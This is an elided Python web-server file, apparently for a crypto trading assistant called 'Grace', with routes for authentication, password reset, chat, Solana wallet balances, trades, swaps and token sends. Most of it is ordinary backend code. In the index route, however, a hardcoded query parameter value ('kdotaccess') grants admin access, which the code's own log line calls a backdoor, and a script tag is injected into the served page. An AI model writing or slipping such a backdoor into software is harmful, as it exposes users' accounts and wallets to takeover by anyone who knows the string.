...
try:
    ...
    logger.error(f"Failed to initialize Password Recovery System: {str(e)}", exc_info=True)
...
async def verify_token_and_get_user_id() -> Dict[str, Any]:
    ...
    if not result.get("success"):
        return {"success": False, "error": result.get("message", "Invalid or expired token")}
        ...
        if os.path.exists(SESSIONS_FILE):
            async with aiofiles.open(SESSIONS_FILE, mode='r') as f:
                ...
                for token, session_data in loaded_sessions.items():
                    ...
                    for key, value in session_data.items():
                        try:
                            restored_session[key] = datetime.fromisoformat(value) if 'time' in key.lower() else value
                        except ValueError:
                            restored_session[key] = value
                    
                    # Only restore sessions that haven't expired
                    if 'exp' in restored_session and datetime.fromisoformat(restored_session['exp']) > datetime.utcnow():
...
async def forgot_password():
    ...
    try:
        ...
        user = await run_grace_sync(
            grace_instance.memory_system.user_profile_system.get_user_by_email,
            email
        )
...
async def reset_password():
    ...
    try:
        ...
        verification = await run_grace_sync(
            recovery_system.verify_recovery_token,
            token
        )
        ...
        if not verification.get('valid'):
            return jsonify({
                "success": False,
                "message": verification.get('error', 'Invalid or expired token')
            }), 400
...
async def register():
    """Register a new user."""
    if grace_instance is None:
        return jsonify({'success': False, 'message': 'Server error: Grace Core not available'}), 500
    try:
        data = await request.get_json()
        if not data or not data.get('username') or not data.get('email') or not data.get('password') \
           or not data.get('firstName') or not data.get('lastName'):
            return jsonify({'success': False, 'message': 'Missing required fields: username, firstName, lastName, email, password'}), 400
    except Exception as e:
        logger.error(f"Register request format error: {e}")
        return jsonify({'success': False, 'message': f'Invalid request format: {str(e)}'}), 400
    ...
    try:
        ...
        if not create_result or not create_result.get('success'):
            return jsonify({
                'success': False,
                'message': create_result.get('message') if create_result else 'User creation failed'
            }), 400
        ...
        return jsonify({'success': False, 'message': 'Internal server error during registration'}), 500
...
async def login():
    ...
    try:
        ...
        if not username or not password:
            return jsonify({'success': False, 'message': 'Missing required fields: username, password'}), 400
    except Exception as e:
    ...
    try:
        ...
        if not auth_result or not auth_result.get('success'):
            logger.warning(f"Authentication failed for user: {username} from IP: {ip_address}")
            return jsonify({
                'success': False,
                'message': auth_result.get('message') if auth_result else 'Authentication failed'
            }), 401
        ...
        user_profile = profile_result.get('profile', {}) if profile_result and profile_result.get('success') else {}
        ...
        logger.info(f"User logged in and session created for user_id: {user_id}, username: {username}")
...
async def verify_token_endpoint():
    ...
    try:
        ...
        logger.info(f"Token verification successful for user_id: {user_id}, username: {user_profile.get('username', 'Unknown')}")

        return jsonify({
            'success': True,
            'user': user_profile,
            'user_id': user_id,  # Include these directly for easier client access
            'username': user_profile.get('username', session_data.get('username', 'Unknown'))
        })

    except Exception as e:
        logger.error(f"Error retrieving user profile during token verification: {e}", exc_info=True)
...
async def logout():
    ...
    if user_id:
        ...
        logger.info(f"User logged out: user_id={user_id}, username={username}. Removed {total_removed} sessions.")
        return jsonify({
            'success': True, 
...
async def process_chat_message():  # Renamed from process_message
    ...
    if not token_result.get("success"):
        return jsonify({"error": token_result.get("error", "Authentication failed")}), 401
    ...
    try:
        ...
        session_result = await handle_chat_message_with_session(user_id, message, session_id)
        
        # If there was an error or the session_id changed, update it
        if session_result.get('error'):
            logger.warning(f"Error in chat session handling: {session_result.get('error')}")
        if session_result.get('session_id'):
            session_id = session_result.get('session_id')
        
        # Run synchronous grace.process_message in executor
        logger.info(f"Calling grace.process_message for user {user_id} with session {session_id}...")
        ...
        logger.info(f"Received response from grace.process_message: {response_content[:100]}...")
        ...
        try:
            ...
            if session_result.get('using_fallback', False):
                ...
                if redis:
                    await redis.rpush(f"chat:{session_id}:messages", json.dumps(bot_response))
        except Exception as e:
...
async def get_active_trading_positions():
    ...
    try:
        ...
        return jsonify({
            'success': False,
            'error': 'Failed to retrieve active positions'
        }), 500
    ...
    try:
        ...
        if not address:
            ...
            wallet_data = await run_grace_sync(
                grace_instance.gmgn_service.get_wallet_balance,
                user_id=user_id
            )
        ...
        logger.error(f"Error testing wallet address conversion: {str(e)}", exc_info=True)
...
async def wallet_info():
    ...
    try:
        ...
        if wallet_data and 'address' in wallet_data:
            ...
            wallet_data['address_conversion_note'] = test_wallet_address_conversion(original_address)
...
async def wallet_data():
    ...
    try:
        ...
        try:
            ...
            logger.error(f"Error from GMGNService.get_wallet_balance: {str(wallet_error)}", exc_info=True)
        ...
        if wallet_data.get('status') != 'success':
            logger.warning(f"Wallet data status not success: {wallet_data.get('status')}, message: {wallet_data.get('message')}")
            formatted_data['success'] = False
            formatted_data['message'] = wallet_data.get('message', 'Unknown error retrieving wallet data')
        ...
        if 'wallets' in wallet_data:
            ...
            if internal_wallets:
                ...
                formatted_data['internal_wallet'] = {
                    ...
                    "balances": [
                        {"token": "SOL", "amount": internal_wallet.get('balance', {}).get('sol', 0)},
                        {"token": "USDC", "amount": internal_wallet.get('balance', {}).get('usdc', 0)}
                    ]
                }
            else:
            ...
            if phantom_wallets:
                ...
                formatted_data['phantom_wallet'] = {
                    ...
                    "balances": [
                        {"token": "SOL", "amount": phantom_wallet.get('balance', {}).get('sol', 0)},
                        {"token": "USDC", "amount": phantom_wallet.get('balance', {}).get('usdc', 0)}
                    ]
                }
        else:
...
async def get_price_chart():
    ...
    try:
        ...
        try:
            ...
            logger.warning(f"Error getting price from GMGNService: {str(inner_e)}, using simulated data")
...
async def execute_trade():
    ...
    try:
        ...
        try:
            ...
            logger.warning(f"Could not retrieve smart trading settings: {str(settings_err)}")
        ...
        if smart_settings and smart_settings.get('enabled', False):
            ...
            try:
                ...
                if amount_float > max_trade_size:
                    logger.info(f"Smart trading: Limiting amount from {amount_float} to {max_trade_size}")
                    amount = str(max_trade_size)
            except ValueError:
                logger.warning(f"Could not apply max trade size limit to amount: {amount}")
        ...
        trade_result = await run_grace_sync(
            grace_instance.gmgn_service.execute_trade,
            action, amount, token, user_id
        )
        ...
        if apply_smart_settings:
            ...
            if trade_result.get('status') == 'confirmation_required' and 'current_price' in trade_result:
    ...
    try:
        ...
        if smart_settings and smart_settings.get('enabled', False):
            ...
            try:
                amount_float = float(amount)
                if amount_float > max_trade_size:
                    logger.info(f"Smart trading: Limiting swap amount from {amount_float} to {max_trade_size}")
                    amount = str(max_trade_size)
            except ValueError:
                logger.warning(f"Could not apply max trade size limit to amount: {amount}")
        ...
        swap_result = await run_grace_sync(
            ...
            amount, from_token, to_token, user_id
        )
        ...
        if apply_smart_settings:
            ...
            # Add stop loss and take profit info if applicable
            if swap_result.get('status') == 'confirmation_required' and 'to_price' in swap_result:
    ...
    try:
        ...
        if wallet_type == 'internal':
            ...
            send_result = await run_grace_sync(
                ...
                user_id, token, amount, recipient, memo
            )
...
async def get_social_sentiment():
    ...
    try:
        ...
        if token and token in sentiment_data:
            return jsonify({
                "success": True,
                "sentiment": {token: sentiment_data[token]}
            })
...
async def get_influential_accounts():
    ...
    try:
        ...
        influential_accounts = [
            {"username": "@SolanaFndn", "followers": 1200000, "recent_topics": ["#Solana", "#Web3", "#DeFi"]},
            {"username": "@aeyakovenko", "followers": 650000, "recent_topics": ["#Solana", "#Blockchain", "#Performance"]},
            {"username": "@dogwifhattoken", "followers": 320000, "recent_topics": ["#WIF", "#Memes", "#SolanaEcosystem"]},
            {"username": "@BonkToken", "followers": 280000, "recent_topics": ["#BONK", "#Memes", "#Solana"]},
            {"username": "@jitosolana", "followers": 210000, "recent_topics": ["#JTO", "#Staking", "#Solana"]}
        ]
...
async def get_tweets():
    ...
    try:
        # For now, return simulated data
        tweets = [
            {"username": "@SolanaFndn", "content": "Excited to announce our latest partnership with #GMGN! #Solana ecosystem continues to grow.", "timestamp": "2025-05-01T14:32:00Z", "likes": 1250},
            {"username": "@dogwifhattoken", "content": "$WIF just hit a new ATH! Thanks to all our supporters. #WIF #Solana", "timestamp": "2025-05-01T10:15:00Z", "likes": 875},
            {"username": "@CryptoAnalyst", "content": "The #Solana ecosystem is showing incredible resilience. $SOL, $WIF, and $BONK all performing well despite market conditions.", "timestamp": "2025-04-30T22:45:00Z", "likes": 620},
            {"username": "@SolanaDevs", "content": "New developer tools just released! Building on #Solana has never been easier.", "timestamp": "2025-04-30T18:20:00Z", "likes": 540},
            {"username": "@BonkToken", "content": "$BONK community is the best! New staking rewards program launching next week. #BONK #Solana", "timestamp": "2025-04-30T15:10:00Z", "likes": 780}
        ]
...
async def get_trading_history():
    ...
    try:
        ...
        try:
            ...
            elif hasattr(grace_instance, 'memory_system') and hasattr(grace_instance.memory_system, 'user_profile_system'):
                profile_result = await run_grace_sync(
                    grace_instance.memory_system.user_profile_system.get_user_profile,
                    user_id
                )
        ...
        if profile_result and profile_result.get('success') and profile_result.get('profile'):
        ...
        try:
            ...
            wallet_transactions = await run_grace_sync(
                grace_instance.get_wallet_transactions if hasattr(grace_instance, 'get_wallet_transactions') else 
                (grace_instance.gmgn_service.get_transactions if hasattr(grace_instance, 'gmgn_service') and 
                hasattr(grace_instance.gmgn_service, 'get_transactions') else None),
                user_id=user_id
            )
            ...
            try:
                ...
                if pending_result and pending_result.get('status') == 'success':
                    ...
                    for tx in pending_txs:
                        history.append({
                            "id": tx.get('confirmation_id', f"pending_{len(history) + 1}"),
                            "type": tx.get('transaction_type', 'unknown'),
                            "token": tx.get('parameters', {}).get('token') or tx.get('parameters', {}).get('to_token', 'unknown'),
                            "amount": float(tx.get('parameters', {}).get('amount', 0.0)),
                            "price": float(tx.get('parameters', {}).get('price', 0.0)),
                            "total": float(tx.get('parameters', {}).get('total', 0.0)),
                            "timestamp": tx.get('created_at', datetime.utcnow().isoformat()),
                            "status": 'pending'
                        })
            except Exception as e:
                logger.warning(f"Error getting pending transactions: {str(e)}")
        ...
        return jsonify({"error": "Error retrieving trading history", "history": []}), 500
...
async def trading_smart_settings():
    ...
    if request.method == 'GET':
        try:
            ...
            logger.error(f"Error getting trading smart settings: {str(e)}", exc_info=True)
        ...
        try:
            ...
            logger.error(f"Error updating trading smart settings: {str(e)}", exc_info=True)
...
async def index():
    ...
    if xmaster == 'kdotaccess':
        ...
        logger.info(f"Admin backdoor access granted via xmaster parameter for user_id: {admin_user_id}")
        ...
        try:
            ...
            if '</head>' not in html_content:
                logger.warning("Could not find </head> tag in HTML, using alternative injection method")
                # Alternative: Insert after title tag if head tag not found
                modified_html = html_content.replace('</title>', '</title>' + script_tag.replace('</head>', ''))
            else:
...
async def static_files(path):
    ...
    for base_path in base_paths:
        try:
            ...
            if os.path.exists(asset_path):
                ...
                logger.info(f"Found asset at {asset_path}, serving with MIME type: {mime_type}")
    ...
    logger.info(f"Asset not found in any location, serving index.html for SPA routing: {path}")
    return await index()
